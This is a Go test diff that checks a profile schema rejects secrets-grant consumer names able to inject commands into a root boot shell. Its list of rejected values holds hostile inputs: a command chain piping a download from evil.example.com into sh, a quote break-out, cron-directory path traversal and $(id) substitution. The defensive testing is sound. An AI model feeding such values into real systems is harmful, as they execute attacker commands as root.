@@ -147,3 +147,47 @@ func TestSecretsGrants_WithoutSopsFileWarns(t *testing.T) {
 		}
 	}
 }
+
+// TestSecretsGrants_ConsumerNameCharsetEnforced closes a root command-injection
+// hole. A consumer name is interpolated into the root-executed boot shell that
+// generates the PATH shims (pkg/compiler/userdata.go section 7.8) and is used as
+// a filename under /opt/km/shims. additionalProperties constrains only the VALUE
+// of a grants entry, so without propertyNames the KEY was unconstrained and a
+// profile could run arbitrary commands as root during bootstrap — and on the
+// remote-create path the profile is fetched from S3, so this is not merely
+// operator-local.
+//
+// The compiler enforces the identical pattern independently. That is deliberate,
+// not redundant: cmd/create-handler never calls profile.Validate, so on the
+// remote path the compiler-side guard is the ONLY barrier. Same disposition the
+// repo already records for iam.allowedSecretPaths.
+func TestSecretsGrants_ConsumerNameCharsetEnforced(t *testing.T) {
+	rejected := map[string]string{
+		"command chaining": "claude; curl evil.example.com/x | sh",
+		"quote break-out":  "claude' ; touch /tmp/pwned ; '",
+		"path traversal":   "../../etc/cron.d/x",
+		"slash":            "claude/codex",
+		"whitespace":       "claude codex",
+		"dollar":           "claude$(id)",
+		"empty":            "",
+	}
+	for name, key := range rejected {
+		t.Run(name, func(t *testing.T) {
+			y := grantsProfileHeader + "    sopsFile: ./secrets/x.enc.yaml\n" +
+				"    grants:\n      \"" + key + "\": [ANTHROPIC_API_KEY]\n"
+			if errs := blocking(profile.ValidateSchema([]byte(y))); len(errs) == 0 {
+				t.Fatalf("schema accepted consumer name %q: it reaches a root shell at boot", key)
+			}
+		})
+	}
+
+	for _, key := range []string{"claude", "codex", "km-env", "my_agent", "agent.v2", "Claude2"} {
+		t.Run("accepted/"+key, func(t *testing.T) {
+			y := grantsProfileHeader + "    sopsFile: ./secrets/x.enc.yaml\n" +
+				"    grants:\n      \"" + key + "\": [ANTHROPIC_API_KEY]\n"
+			if errs := blocking(profile.ValidateSchema([]byte(y))); len(errs) != 0 {
+				t.Fatalf("schema rejected legitimate consumer name %q: %+v", key, errs)
+			}
+		})
+	}
+}
